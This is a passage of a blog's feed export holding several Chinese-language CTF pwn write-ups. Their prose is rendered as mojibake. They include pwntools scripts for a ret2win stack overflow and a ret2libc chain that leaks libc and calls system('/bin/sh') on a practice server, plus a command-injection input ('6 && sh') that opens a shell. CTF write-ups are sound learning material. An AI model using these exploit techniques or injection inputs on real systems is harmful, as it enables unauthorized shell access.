&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>outBackdoor Write Up</title>
    <link href="https://www.fomal.cc/posts/d5134afd.html"/>
    <id>https://www.fomal.cc/posts/d5134afd.html</id>
    <published>2023-04-02T03:02:22.719Z</published>
    <updated>2023-04-09T06:24:33.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ÂàÜÊûê">1.ÂàÜÊûê</h2><p>ÊãøÂà∞È¢òÁõÆÂÖàÁî®checksecÊ£ÄÊü•ÂèëÁé∞Ê≤°ÊúâÂºÄÂêØcanary‰øùÊä§,Áî®IDA64ÂàÜÊûêÂèëÁé∞<code>gets(v4)</code>ÊúâÊ†àÊ∫¢Âá∫ÁöÑÊºèÊ¥ûÂèØ‰ª•Âà©Áî®,ÂèàÂèëÁé∞ÊúâÁõ¥Êé•ËøîÂõûshellÁöÑoutBackdoorÂáΩÊï∞.<br>Áõ¥Êé•ÊâßË°åÁ®ãÂ∫èÂèëÁé∞ÊùÉÈôê‰∏çË∂≥,‰ΩøÁî®<code>chmod 755 outBackdoor</code>Êù•ÊèêÊùÉ<br>Áî®cyclicÁîüÊàê‰∏Ä‰∏≤Â§ß‰∫é16ÁöÑÂ≠óÁ¨¶‰∏≤Â§çÂà∂‰∏ãÊù•<br><code>cyclic 32 aaaabaaacaaadaaaeaaafaaagaaahaaa</code><br>ÂØπÊñá‰ª∂gdbË∞ÉËØï,ËæìÂÖ•Â≠óÁ¨¶‰∏≤,Âá∫Áé∞Ê†àÊ∫¢Âá∫<br><code>*RSP  0x7fffffffdd78 ‚óÇ‚Äî 'gaaahaaa'</code><br>ÁªèËøáËÆ°ÁÆóÂèëÁé∞ÊòØÂú®Ââç24‰∏™Â≠óÁ¨¶Êó∂ÁöÑ‰ΩçÁΩÆÂá∫Áé∞,<br>ÊâÄ‰ª•ÈúÄË¶ÅÂú®Ëøô‰∏™‰ΩçÁΩÆË¶ÜÁõñ‰∏äËøîÂõûshellÁöÑÂáΩÊï∞Âú∞ÂùÄ.</p><h2 id="2-exploitation">2.exploitation</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;ip&#x27;</span>,&lt;port&gt;)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(<span class="number">0x4011D7</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ÂèëÁé∞Ê≤°ÊúâÊàêÂäüËøîÂõûshell,‰∏äÁΩëÊü•ÊâæÂèëÁé∞Ë≤å‰ººÂíåsystemÂáΩÊï∞ÊúâÂÖ≥,Êõ¥Êç¢Âú∞ÂùÄ‰∏∫ÂêéÈó®ÂáΩÊï∞Âú∞ÂùÄÁöÑ‰∏ã‰∏Ä‰∏™Âú∞ÂùÄ<code>0x4011D8</code>ÊàêÂäüË∑≥ËΩ¨Âà∞ÂáΩÊï∞,ËøîÂõûshell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">W...w...Wait? Who put this backdoor out back here?</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libc-2.27.so</span><br><span class="line">outBackdoor</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ÂàÜÊûê&quot;&gt;1.ÂàÜÊûê&lt;/h2&gt;
&lt;p&gt;ÊãøÂà∞È¢òÁõÆÂÖàÁî®checksecÊ£ÄÊü•ÂèëÁé∞Ê≤°ÊúâÂºÄÂêØcanary‰øùÊä§,Áî®IDA64ÂàÜÊûêÂèëÁé∞&lt;code&gt;gets(v4)&lt;/code&gt;ÊúâÊ†àÊ∫¢Âá∫ÁöÑÊºèÊ¥ûÂèØ‰ª•Âà©Áî®,ÂèàÂèëÁé∞ÊúâÁõ¥Êé•ËøîÂõûshellÁöÑoutBackdoorÂáΩÊï∞.&lt;br&gt;
Áõ¥Êé•ÊâßË°åÁ®ãÂ∫è</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>OGeek2019babyrop 1</title>
    <link href="https://www.fomal.cc/posts/875b5e79.html"/>
    <id>https://www.fomal.cc/posts/875b5e79.html</id>
    <published>2023-04-02T03:02:22.717Z</published>
    <updated>2023-04-09T06:24:26.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-‰º™‰ª£Á†Å">1.‰º™‰ª£Á†Å</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">process</span><span class="params">(<span class="type">int</span> privous_buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> sucLen; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, privous_buf);               <span class="comment">// print the random integer into s</span></span><br><span class="line">  sucLen = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);                 <span class="comment">// guess the random</span></span><br><span class="line">  buf[sucLen - <span class="number">1</span>] = <span class="number">0</span>;                          <span class="comment">// &#x27;\x00&#x27;</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )                    <span class="comment">// compare NULL and the random integer</span></span><br><span class="line">                                                <span class="comment">// definitely the return is True and execute exit()</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);                    <span class="comment">// if not ,this is the notice</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">process2</span><span class="params">(<span class="type">char</span> buf7)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( buf7 == <span class="number">127</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, buf7);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  initialization();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = process1(buf);                           <span class="comment">// give buf a random value</span></span><br><span class="line">  process2(v2);                                 <span class="comment">// v2 is the process&#x27;s buf[7]</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞Á®ãÂ∫èÊ≤°ÊúâÂºÄÂêØPIEÈò≤Êä§,ÈÇ£‰πàÂ∞±ÂèØ‰ª•Áî®Â∏∏ËßÅÁöÑret2libcÊâãÊ≥ïÊù•Ëß£ÂÜ≥ÈóÆÈ¢ò‰∫Ü.</p><p>Á®ãÂ∫èÁöÑÊâßË°åÊµÅÂíåÊîªÂáªÊâãÊÆµÂ§ßÊ¶ÇËß£Èáä‰∏Ä‰∏ã,ÂÖàÁîüÊàê‰∏Ä‰∏™ÈöèÊú∫Êï∞,Â∞ÜÂõõ‰ΩçÈöèÊú∫Êï∞‰º†ÂÖ•Âà∞<code>process1()</code>,Âú®p1ÂáΩÊï∞ÈáåÈù¢Êúâ‰∏Ä‰∏™ÂàÜÊîØ,Ë¶ÅËæìÂÖ•‰∏Ä‰∏™Êï∞Â≠óÊù•ÂíåÈöèÊú∫Êï∞ÊØîËæÉ,‰∏çÂêåÂàôÁªìÊùü,Áõ∏ÂêåÂàôÁªßÁª≠,ËøôÈáåÈúÄË¶ÅÁü•ÈÅìÁöÑÊòØ<code>strcmp()</code>Â¶ÇÊûúÂÖ∂‰∏≠‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ËØªÂèñÂà∞<code>'\0'</code>ÁöÑÊó∂ÂÄôÂ∞±‰ºöÁªìÊùü.ÂΩìp1ÂáΩÊï∞ÁªìÊùüÁöÑÊó∂ÂÄôÂ∞Ü‰ºöËøîÂõû<code>buf[7]</code>Âà∞<code>process2()</code>Êù•ËøõË°å‰∏ã‰∏Ä‰∏™ÂàÜÊîØÂà§Êñ≠,ËøôÈáåÊâìÂºÄÁÇπÊÄùË∑Ø,Âú®<code>buf[0]</code>Â∞±‰º†ÂÖ•<code>'\0'</code>ÁÑ∂ÂêéÊääÊàë‰ª¨ÈúÄË¶ÅÁöÑÊï∞Â≠ó‰º†ÂÖ•Âà∞<code>buf[7]</code>ÈáåÈù¢,p2ÂáΩÊï∞ÈáåÁöÑbufÈùûÂ∏∏Â§ß,Â¶ÇÊûúÂè™ÊòØ<code>buf[7]</code>ÊîπÊàê127‰ºöÊó†Ê≥ïÊ∫¢Âá∫,‰ΩÜÊòØÂ¶ÇÊûúÊîπÊàêÂ§ßÁöÑÊï∞Â≠óÂ∞±ÂèØ‰ª•Áã†Áã†Âú∞Ê∫¢Âá∫‰∫Ü.</p><p>ÊûÑÈÄ†ÂÆåÊ†àÊ∫¢Âá∫ÊºèÊ¥û‰πãÂêé,Âõ†‰∏∫Á®ãÂ∫èÁöÑ.pltÊ≤°Êúâ<code>system()</code>,‰πüÊ≤°ÊúâÁªôÂá∫glibcÁöÑÁâàÊú¨,Â∞±ÈúÄË¶ÅÊàë‰ª¨ÊâãÂä®Ê≥ÑÈú≤ÁâàÊú¨ÁÑ∂ÂêéË∞ÉÁî®<code>system(&quot;bin/sh&quot;)</code></p><p>ËøôÈáåÈ°∫‰æøÂ§ç‰π†‰∏Ä‰∏ãÊ≠•È™§,ËøôÈáåÊ≤°ÂºÄPIEÂ∞±Áõ¥Êé•Áî®ELFÊñπÊ≥ïÊù•Êâæ,ÊúâÂºÄÂ∞±ÂæóÊÉ≥ÂäûÊ≥ïÊ≥ÑÈú≤Âá∫Á®ãÂ∫èÁöÑÂä†ËΩΩÂü∫Âú∞ÂùÄÁÑ∂ÂêéÂÜçËé∑ÂèñÊüê‰∫õÂ∫ìÂáΩÊï∞ÁöÑ.pltÂíå.gotÂú∞ÂùÄ.</p><h3 id="1-Ëé∑ÂèñÁ®ãÂ∫è‰∏≠ÊúâÁöÑÂáΩÊï∞ÁöÑwrite-pltÂíåread-gotÂú∞ÂùÄ">(1) Ëé∑ÂèñÁ®ãÂ∫è‰∏≠ÊúâÁöÑÂáΩÊï∞ÁöÑwrite@pltÂíåread@gotÂú∞ÂùÄ</h3><p>ËøôÈáåÁöÑ<code>read()</code>‰πüÂèØ‰ª•ÊòØÂà´ÁöÑÂáΩÊï∞,ÂÆûÂú®Ê≤°ÊúâÂ∞±<code>__libc_start_main</code>‰πüÊòØÂÆåÂÖ®okÁöÑ,</p><p>Áî®pltÊòØÊãøÊù•Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄÁöÑ,Áî®gotÂàôÊòØÂõ†‰∏∫gotÂ≠ò‰∫ÜlibcÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄ,ÂèØ‰ª•ÊãøÂéªÁªôÂÅö<code>write()</code>ÁöÑÂèÇÊï∞.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0xdeadbeef</span> <span class="comment">#Ëøô‰∏™ÊòØËøîÂõûÂú∞ÂùÄ</span></span><br></pre></td></tr></table></figure><h3 id="2-ÊûÑÈÄ†ROPÈìæÊù•Ê≥ÑÈú≤Â∫ìÂáΩÊï∞ÁúüÂÆûÂú∞ÂùÄ">(2) ÊûÑÈÄ†ROPÈìæÊù•Ê≥ÑÈú≤Â∫ìÂáΩÊï∞ÁúüÂÆûÂú∞ÂùÄ</h3><p>Áî±‰∫éËøôÈáåÊûÑÈÄ†ÁöÑÊòØ32‰ΩçÁ®ãÂ∫èÁöÑROPÈìæ,Â¶ÇÊûúÊòØ64‰ΩçÁöÑËøòÈúÄË¶ÅËé∑Âæópop retÁ≥ªÂàóÁöÑgadgets</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(read_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&quot;read_addr:&quot;</span><span class="built_in">hex</span>(read_addr))</span><br></pre></td></tr></table></figure><h3 id="3-Ê≥ÑÈú≤glibcÁâàÊú¨Âπ∂Ëé∑ÂèñÈúÄË¶ÅÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄ">(3) Ê≥ÑÈú≤glibcÁâàÊú¨Âπ∂Ëé∑ÂèñÈúÄË¶ÅÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lic=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;system:&quot;</span>system)</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29693</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x08048825&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;\x00&#x27;</span>+<span class="number">6</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0xE7</span>+<span class="number">0x4</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload2=cyclic(offset)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">read_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&#x27;read_addr:&#x27;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">base=read_addr-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;bin/sh&#x27;</span>)) <span class="comment">##Ë¶Å‰ª•Â≠óËäÇÂûãÊï∞ÊçÆÊù•ÊêúÁ¥¢!</span></span><br><span class="line">payload3=cyclic(offset)+p32(system_addr)+<span class="string">b&#x27;dead&#x27;</span>+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4">4.</h2><p>ËøôÈ¢òËß£‰∏çÂá∫Êù•Êúâ‰ª•‰∏ãÂá†‰∏™Áü•ËØÜÁÇπ</p><h3 id="1">(1)</h3><p>‰∏çÁ°ÆÂÆö<code>strcmp()</code>Âú®ÈÅáÂà∞<code>'\0'</code>ÁöÑÊó∂ÂÄô‰ºöÁõ¥Êé•ÂÅúÊ≠¢ÊØîËæÉÊù•Ë∑≥Ëøá,ÂÆûÈôÖ‰∏äÊòØ‰ºöÁöÑ</p><h3 id="2">(2)</h3><p>ÂøòËÆ∞‰∫ÜÈ¢òÁõÆÊ≤°ÂºÄPIEÂèØ‰ª•Áõ¥Êé•ÊãøglibcÁöÑÂáΩÊï∞ÂÖàretÁöÑ,ËøòÊúâÂøΩÁï•‰∫ÜÈ¢òÁõÆÂ∑≤ÁªèÁªôÂá∫‰∫ÜlibcÁöÑÁâàÊú¨‚Ä¶</p><h3 id="3">(3)</h3><p>ÂøòËÆ∞ÂÜôÊ≥®ÈáäÂØºËá¥Á¨¨‰∫åÊ¨°Êâæ‰∏çÂà∞ÁúüÊ≠£ÊîªÂáªÁöÑÊºèÊ¥ûÊòØÁ¨¨‰∫å‰∏™ÂáΩÊï∞ÁöÑelseÂà§Êñ≠.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-‰º™‰ª£Á†Å&quot;&gt;1.‰º™‰ª£Á†Å&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>just test nc &amp;&amp; database Write Up</title>
    <link href="https://www.fomal.cc/posts/86c9736c.html"/>
    <id>https://www.fomal.cc/posts/86c9736c.html</id>
    <published>2023-04-02T03:02:22.716Z</published>
    <updated>2023-04-09T06:24:20.003Z</updated>
    
    <content type="html"><![CDATA[<p>1.Áî®netcatËøû‰∏äÂú∞ÂùÄÂ∞±ËÉΩÁúãÂà∞flag,cat‰∏Ä‰∏ãËé∑Âèñ</p><p>2.ÂΩìÈÄâÊã©6ÈÄÄÂá∫Á≥ªÁªüÊó∂,6ÂØπÂ∫îÁöÑÂáΩÊï∞ÊúâÂæà‰∏•ÈáçÁöÑbug,‰ºöÁî®systemÊâßË°åecho s,sÂ∞±ÊòØËæìÂÖ•ÁöÑÂëΩ‰ª§,Êàë‰ª¨Âè™ÈúÄË¶ÅÁî®&amp;&amp;ÂêåÊó∂ËæìÂÖ•Â§öÊù°ÂëΩ‰ª§Ë∞ÉÁî®shellÂç≥ÂèØ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;echo %s&quot;</span>, s);</span><br><span class="line">system(command);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">6 &amp;&amp; sh   </span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">pwn</span><br><span class="line"><span class="built_in">cat</span> flag</span><br><span class="line">......</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.Áî®netcatËøû‰∏äÂú∞ÂùÄÂ∞±ËÉΩÁúãÂà∞flag,cat‰∏Ä‰∏ãËé∑Âèñ&lt;/p&gt;
&lt;p&gt;2.ÂΩìÈÄâÊã©6ÈÄÄÂá∫Á≥ªÁªüÊó∂,6ÂØπÂ∫îÁöÑÂáΩÊï∞ÊúâÂæà‰∏•ÈáçÁöÑbug,‰ºöÁî®systemÊâßË°åecho s,sÂ∞±ÊòØËæìÂÖ•ÁöÑÂëΩ‰ª§,Êàë‰ª¨Âè™ÈúÄË¶ÅÁî®&amp;amp;&amp;amp;ÂêåÊó∂ËæìÂÖ•Â§öÊù°ÂëΩ‰ª§Ë∞ÉÁî®shellÂç≥ÂèØ&lt;/p&gt;
&lt;figure c</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level2_x64 WP</title>
    <link href="https://www.fomal.cc/posts/17a38a07.html"/>
    <id>https://www.fomal.cc/posts/17a38a07.html</id>
    <published>2023-04-02T03:02:22.714Z</published>
    <updated>2023-04-09T06:24:14.037Z</updated>
    
    <content type="html"><![CDATA[<p>Êú¨Âú∞Ê≤°ÊúâÊâìÈÄö,ÂÜôÂæóÈùûÂ∏∏ÈöæÂèóÁöÑÁÆÄÂçïÈ¢ò</p><h2 id="1-‰º™‰ª£Á†Å">1.‰º™‰ª£Á†Å</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600A90                               public hint</span><br><span class="line">.data:0000000000600A90 2F 62 69 6E 2F 73 68 00       hint db &#x27;/bin/sh&#x27;,0</span><br><span class="line">.data:0000000000600A90                               _data ends</span><br></pre></td></tr></table></figure><h2 id="2-ÂàÜÊûêÊºèÊ¥û">2.ÂàÜÊûêÊºèÊ¥û</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>Âè™ÂºÄÂêØ‰∫ÜNX‰øùÊä§Âπ∂‰∏îÊúâÊ†àÊ∫¢Âá∫ÊºèÊ¥û,ËÄå‰∏îshift+f12ÁîöËá≥ÂèëÁé∞.dataÂ≠ò‰∫Ü<code>bin/sh</code>,‰∏çËøáÊú¨Âú∞Ë∞ÉËØïÂ•ΩÂÉèÊúâÈóÆÈ¢ò,Â•ΩÂÉèÊòØshell‰∏çÂêåÊâÄ‰ª•ÊâßË°å<code>system()</code>ÁöÑÊó∂ÂÄôÁ®ãÂ∫èÁõ¥Êé•ÁªìÊùü‰∫Ü,ËøôÈáåÊàëÁî®‰∫Ü‰∏¥Êó∂Êõ¥Êç¢shellÁöÑÂëΩ‰ª§‰∏çËøáÊ≤°ÂàáËøáÊù•,ÊúÄÂêéÁî®‰∫ÜIDAÁöÑÂÅèÁßªÈáèÊûÑÈÄ†‰∫Üpayload,Áî±‰∫éÊòØx64Á®ãÂ∫è,ÊâÄ‰ª•ËøòÈúÄË¶ÅÊâæÂà∞<code>pop rdi 